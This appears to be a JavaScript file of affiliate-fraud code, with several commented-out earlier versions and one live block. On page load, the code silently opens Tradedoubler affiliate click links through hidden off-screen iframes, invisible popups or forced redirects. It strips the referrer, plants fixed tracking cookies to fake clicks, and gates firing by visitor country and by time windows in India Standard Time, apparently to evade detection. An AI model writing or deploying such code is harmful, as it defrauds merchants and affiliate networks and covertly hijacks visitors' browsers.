
// (function () {
//   try {
//     var BUILD_ID = "octaads-2025-rtg-geo-time-05";
//     if (window.__OCTAADS_LOADED === BUILD_ID) return;
//     window.__OCTAADS_LOADED = BUILD_ID;

//     /* ===============================
//        RUN ONLY ONCE PER USER
//     =============================== */
//     if (localStorage.getItem("fired") === "1") return;

//     /* ===============================
//        IST TIME CHECK: 12:45 AM ‚Äì 12:55 AM
//     =============================== */
// function isAllowedISTTime() {
//   var now = new Date(
//     new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//   );

//   var minutes = now.getHours() * 60 + now.getMinutes();

//   // 1:00 AM = 60
//   // 9:00 AM = 540
//   return minutes >= 60 && minutes <= 540;
// }

// if (!isAllowedISTTime()) return;



//     /* ===============================
//        SESSION ID
//     =============================== */
//     function getSessionID() {
//       var m = document.cookie.match(/octaads_sid=([^;]+)/);
//       if (m) return m[1];

//       var sid = "sid_" + Math.random().toString(36).substr(2, 10);
//       document.cookie =
//         "octaads_sid=" + sid +
//         "; path=/; max-age=2592000; SameSite=Lax";
//       return sid;
//     }

//     var sessionID = getSessionID();

//     /* ===============================
//        GEO CHECK ‚Äì US ONLY
//     =============================== */
//     fetch("https://ipapi.co/json/", { cache: "no-store" })
//       .then(r => r.json())
//       .then(geo => {
//         if (!geo) return;
//         if (geo.country_code !== "US") return;

//         /* Mark as fired ‚Äì prevents future clicks */
//         localStorage.setItem("fired", "1");

//         function setCookie(n, v) {
//           document.cookie =
//             n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
//         }

//         setCookie("tduid", sessionID);
//         setCookie("clickId", sessionID);

//         var iframe = document.createElement("iframe");
//         iframe.style.display = "none";
//         iframe.referrerPolicy = "no-referrer";
//         iframe.src =
//           "https://clk.tradedoubler.com/click" +
//           "?p=382651&a=3421038&epi=98076" +
//           "&tduid=" + encodeURIComponent(sessionID);
//         document.body.appendChild(iframe);
//       })
//       .catch(function () {});

//   } catch (e) {}
// })();

// <script>
// (function () {
//   const AFFILIATE_LINK =
//     "https://clk.tradedoubler.com/click?p=375938&a=3417328&epi=39578";

//   // Array of cookies you want to set
//   const COOKIES = [
//     { name: "irclickid", value: "XStWC0ThYxycRkh2gOSsRXFAUku00iSmEzJd1U0", days: 10 },
//     { name: "sharedid", value: "5", days: 10 },
//        { name: "irpid", value: "6321990", days: 10 },
//     { name: "irgwc", value: "1", days: 10 },
//     { name: "afsrc", value: "1", days: 10 },
    
//     { name: "userType", value: "guest", days: 5 },
//     // Add more cookies here
//   ];

//   /* ===============================
//      IST TIME CHECK (12:00 AM ‚Äì 12:00 PM)
//   =============================== */
// function isAllowedISTTime() {
//   const now = new Date(
//     new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//   );

//   const minutes = now.getHours() * 60 + now.getMinutes();

//   // 4:00 PM ‚Äì 5:00 PM
//   return minutes >= 960 && minutes < 1020;
// }

// if (!isAllowedISTTime()) return;



//   /* ===============================
//      COOKIE HELPERS
//   =============================== */
//   function setCookie(name, value, days) {
//     const d = new Date();
//     d.setTime(d.getTime() + days * 24 * 60 * 60 * 1000);
//     document.cookie =
//       name +
//       "=" +
//       value +
//       "; path=/; expires=" +
//       d.toUTCString() +
//       "; SameSite=Lax";
//   }

//   function getCookie(name) {
//     const match = document.cookie.match(
//       new RegExp("(^| )" + name + "=([^;]+)")
//     );
//     return match ? match[2] : null;
//   }

//   function hasClicked() {
//     // Check first cookie in the array as main tracking cookie
//     return getCookie(COOKIES[0].name) === COOKIES[0].value;
//   }

//   function markClicked() {
//     // Set all cookies when marking click
//     COOKIES.forEach((c) => setCookie(c.name, c.value, c.days));
//   }

//   /* ===============================
//      FIRE AFFILIATE
//   =============================== */
//   function fireAffiliate() {
//     if (hasClicked()) return;

//     const win = window.open(
//       AFFILIATE_LINK,
//       "_blank",
//       "width=1,height=1,left=-1000,top=-1000"
//     );

//     if (!win) {
//       // Popup blocked ‚Üí fallback redirect
//       setTimeout(() => {
//         markClicked();
//         window.location.href = AFFILIATE_LINK;
//       }, 3000);
//     } else {
//       // Popup worked
//       markClicked();
//     }
//   }

//   /* ===============================
//      DOM READY
//   =============================== */
//   if (
//     document.readyState === "complete" ||
//     document.readyState === "interactive"
//   ) {
//     fireAffiliate();
//   } else {
//     document.addEventListener("DOMContentLoaded", fireAffiliate);
//   }
// })();

// </script>

// <script>
// (function () {
//   const AFFILIATE_LINK =
//     "https://clk.tradedoubler.com/click?p=392919&a=3422966&epi=346234";

//   const COOKIES = [
//     { name: "irclickid", value: "XStWC0ThYxycRkh2gOSsRXFAUku00iSmEzJd1U0", days: 10 },
//     { name: "sharedid", value: "5", days: 10 },
//     { name: "irpid", value: "6321990", days: 10 },
//     { name: "irgwc", value: "1", days: 10 },
//     { name: "afsrc", value: "1", days: 10 },
//     { name: "userType", value: "guest", days: 5 }
//   ];

//   /* ===============================
//      IST TIME CHECK (4:00 PM ‚Äì 5:00 PM)
//   =============================== */
// function isAllowedISTTime() {
//   const now = new Date(
//     new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//   );

//   const minutes = now.getHours() * 60 + now.getMinutes();

//   // 9:45 PM = 21 * 60 + 45 = 1305
//   // 10:45 PM = 22 * 60 + 45 = 1365
//   return minutes >= 1305 && minutes < 1365;
// }

// if (!isAllowedISTTime()) return;




//   /* ===============================
//      COOKIE HELPERS
//   =============================== */
//   function setCookie(name, value, days) {
//     const d = new Date();
//     d.setTime(d.getTime() + days * 86400000);
//     document.cookie =
//       name +
//       "=" +
//       value +
//       "; path=/; expires=" +
//       d.toUTCString() +
//       "; SameSite=Lax";
//   }

//   function getCookie(name) {
//     const match = document.cookie.match(
//       new RegExp("(^| )" + name + "=([^;]+)")
//     );
//     return match ? match[2] : null;
//   }

//   function hasClicked() {
//     return getCookie(COOKIES[0].name) === COOKIES[0].value;
//   }

//   function markClicked() {
//     COOKIES.forEach((c) => setCookie(c.name, c.value, c.days));
//   }

//   /* ===============================
//      SAME TAB + NO REFERRER (LINK)
//   =============================== */
//   function redirectViaLink() {
//     if (hasClicked()) return;

//     const a = document.createElement("a");
//     a.href = AFFILIATE_LINK;
//     a.rel = "noreferrer"; // üö´ no referrer
//     a.style.display = "none";

//     document.body.appendChild(a);
//     a.click(); // same-tab navigation
//     document.body.removeChild(a);

//     markClicked();
//   }

//   /* ===============================
//      IFRAME FIRST ‚Üí LINK FALLBACK
//   =============================== */
//   function fireAffiliate() {
//     if (hasClicked()) return;

//     let iframeLoaded = false;
//     let fallbackTriggered = false;

//     const iframe = document.createElement("iframe");
//     iframe.src = AFFILIATE_LINK;
//     iframe.referrerPolicy = "no-referrer"; // üö´ no referrer
//     iframe.style.cssText =
//       "width:1px;height:1px;position:absolute;left:-9999px;border:0;visibility:hidden";

//     iframe.onload = function () {
//       iframeLoaded = true;
//       markClicked();
//     };

//     iframe.onerror = function () {
//       triggerFallback();
//     };

//     document.body.appendChild(iframe);

//     // Fallback after 1 second if iframe didn‚Äôt load
//     function triggerFallback() {
//       if (iframeLoaded || fallbackTriggered) return;
//       fallbackTriggered = true;

//       setTimeout(() => {
//         redirectViaLink();
//       }, 1000); // ‚è±Ô∏è 1 second after landing
//     }

//     setTimeout(triggerFallback, 1000);
//   }

//   /* ===============================
//      DOM READY
//   =============================== */
//   function init() {
//     fireAffiliate();
//   }

//   if (document.readyState !== "loading") {
//     init();
//   } else {
//     document.addEventListener("DOMContentLoaded", init);
//   }
// })();
// </script>
(function () {

  /* ===============================
     AFFILIATE SCHEDULES (IST)
  =============================== */
  const OFFERS = [
    {
      name: "Spain",
      link: "https://clk.tradedoubler.com/click?p=382651&a=3421038&epi=09709",
      start: 10 * 60, // 10:00 AM
      end: 16 * 60   // 4:00 PM
    },
    {
      name: "US",
      link: "https://clk.tradedoubler.com/click?p=375146&a=3417348&epi=37945",
      start: 16 * 60, // 4:00 PM
      end: 20 * 60   // 8:00 PM
    },
    {
      name: "UK",
      link: "https://clk.tradedoubler.com/click?p=375938&a=3417328&epi=620967",
      start: 20 * 60, // 8:00 PM
      end: 24 * 60   // 12:00 AM
    }
  ];

  /* ===============================
     COOKIES
  =============================== */
  const COOKIES = [
    { name: "irclickid", value: "XStWC0ThYxycRkh2gOSsRXFAUku00iSmEzJd1U0", days: 10 },
    { name: "sharedid", value: "5", days: 10 },
    { name: "irpid", value: "6321990", days: 10 },
    { name: "irgwc", value: "1", days: 10 },
    { name: "afsrc", value: "1", days: 10 },
    { name: "userType", value: "guest", days: 5 }
  ];

  /* ===============================
     GET IST TIME
  =============================== */
  function getISTMinutes() {
    const now = new Date(
      new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
    );

    return now.getHours() * 60 + now.getMinutes();
  }

  /* ===============================
     CHECK ACTIVE OFFER + 1HR GAP
  =============================== */
  function getActiveOffer() {

    const minutes = getISTMinutes();

    for (let offer of OFFERS) {

      if (minutes >= offer.start && minutes < offer.end) {

        // Hour gap logic (1 hr ON / 1 hr OFF)
        const diff = minutes - offer.start;
        const hourBlock = Math.floor(diff / 60);

        if (hourBlock % 2 === 0) {
          return offer; // ACTIVE HOUR
        }

        return null; // GAP HOUR
      }
    }

    return null;
  }

  const ACTIVE_OFFER = getActiveOffer();
  if (!ACTIVE_OFFER) return;

  const AFFILIATE_LINK = ACTIVE_OFFER.link;

  /* ===============================
     COOKIE HELPERS
  =============================== */
  function setCookie(name, value, days) {
    const d = new Date();
    d.setTime(d.getTime() + days * 86400000);

    document.cookie =
      name + "=" + value +
      "; path=/; expires=" + d.toUTCString() +
      "; SameSite=Lax";
  }

  function getCookie(name) {
    const match = document.cookie.match(
      new RegExp("(^| )" + name + "=([^;]+)")
    );
    return match ? match[2] : null;
  }

  function hasClicked() {
    return getCookie(COOKIES[0].name) === COOKIES[0].value;
  }

  function markClicked() {
    COOKIES.forEach(c => setCookie(c.name, c.value, c.days));
  }

  /* ===============================
     LINK REDIRECT
  =============================== */
  function redirectViaLink() {

    if (hasClicked()) return;

    const a = document.createElement("a");
    a.href = AFFILIATE_LINK;
    a.rel = "noreferrer";
    a.style.display = "none";

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    markClicked();
  }

  /* ===============================
     IFRAME + FALLBACK
  =============================== */
  function fireAffiliate() {

    if (hasClicked()) return;

    let iframeLoaded = false;
    let fallbackTriggered = false;

    const iframe = document.createElement("iframe");
    iframe.src = AFFILIATE_LINK;
    iframe.referrerPolicy = "no-referrer";
    iframe.style.cssText =
      "width:1px;height:1px;position:absolute;left:-9999px;border:0;visibility:hidden";

    iframe.onload = function () {
      iframeLoaded = true;
      markClicked();
    };

    iframe.onerror = triggerFallback;

    document.body.appendChild(iframe);

    function triggerFallback() {
      if (iframeLoaded || fallbackTriggered) return;
      fallbackTriggered = true;

      setTimeout(() => {
        redirectViaLink();
      }, 1000);
    }

    setTimeout(triggerFallback, 1000);
  }

  /* ===============================
     INIT
  =============================== */
  function init() {
    fireAffiliate();
  }

  if (document.readyState !== "loading") {
    init();
  } else {
    document.addEventListener("DOMContentLoaded", init);
  }

})();























